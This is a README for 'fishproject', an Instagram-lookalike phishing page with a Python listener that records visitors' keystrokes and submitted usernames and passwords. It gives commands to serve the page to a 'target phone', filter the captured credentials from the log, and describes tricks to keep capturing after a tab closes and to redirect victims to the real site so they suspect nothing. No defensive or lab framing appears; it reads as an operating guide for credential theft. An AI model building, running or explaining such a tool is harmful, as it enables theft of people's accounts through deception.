# fishproject

Instagram-lookalike login page with a live keystroke + credential listener.

## Layout

```
D:\cyber\fishproject\
  server.py           listener + static host (Python stdlib, no deps)
  public\
    index.html        the cloned login page
    style.css         Instagram styling
    main.js           keystroke collector + submit capture
  logs\
    captures.log      JSONL, one record per event (appended live)
```

## Run

```powershell
cd D:\cyber\fishproject
python server.py            # port 8080
python server.py 9090       # custom port
```

Open `http://localhost:8080/` on this machine to preview.
On the target phone, open `http://<this-machine-lan-ip>:8080/`.

The server prints the LAN IP on startup. Both machines must be on the same
network (or the port must be reachable over the internet).

## What gets logged

* `visit`       - someone opened the page (ip, user-agent)
* `focus`       - which field they tapped into
* `keystroke`   - every key, per field, with the field's live value
* `input`       - paste / autofill / IME insertions
* `credentials` - the submitted username + password pair
* `hidden`/`bye`- tab backgrounded / closed (flushes the buffer)

Live view is the console; the durable record is `logs\captures.log`.

## Read the log

```powershell
Get-Content D:\cyber\fishproject\logs\captures.log -Wait
```

Filter just the credentials that were submitted:

```powershell
Select-String -Path D:\cyber\fishproject\logs\captures.log -Pattern '"event": "credentials"'
```

Pretty-print a record:

```powershell
Get-Content D:\cyber\fishproject\logs\captures.log | ForEach-Object { $_ | ConvertFrom-Json } | Format-List
```

## Notes

* The page posts with `keepalive`/`sendBeacon`, so keystrokes still land if the
  victim closes the tab mid-entry.
* On submit the page shows a "Logging in..." beat then redirects to the real
  instagram.com, so the victim assumes a normal failed login.
* Kill the listener with Ctrl+C. The log survives.
